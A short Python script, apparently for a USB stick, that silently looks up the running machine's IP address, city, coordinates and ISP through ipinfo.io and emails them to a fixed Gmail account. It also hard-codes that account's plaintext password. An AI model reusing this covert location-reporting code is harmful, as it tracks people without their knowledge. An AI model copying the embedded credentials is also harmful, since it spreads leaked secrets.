import smtplib
from email.message import EmailMessage 
message = EmailMessage()
import time

import requests

res = requests.get('https://ipinfo.io/')
data = res.json()


city = data['city']
postal = data['postal']
region = data['region']
ip = data['ip']
provider = data['org']
location = data['loc']


time.sleep(1)

sender = "visq152@gmail.com" 
recipient = "visq152@gmail.com" 
message['From'] = sender
message['To'] = recipient



message['Subject'] = 'Lokalizacja uruchomionego pendriva'

info= "Wiadomosc wyslana z adresu ip: " + ip +  " z miasta: " + city + " " + postal + " o lokalizacji : " + location + " w okolicach regionu: " + region + " dodatkowe info : Dostawca usług sieciowych:" + provider

body = info

message.set_content(body)

logggin = "visq152@gmail.com" 
password = "visqMarcel2009" 
mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
mail_server.set_debuglevel(1)
mail_server.login(logggin,password)
mail_server.send_message(message)
mail_server.quit()
















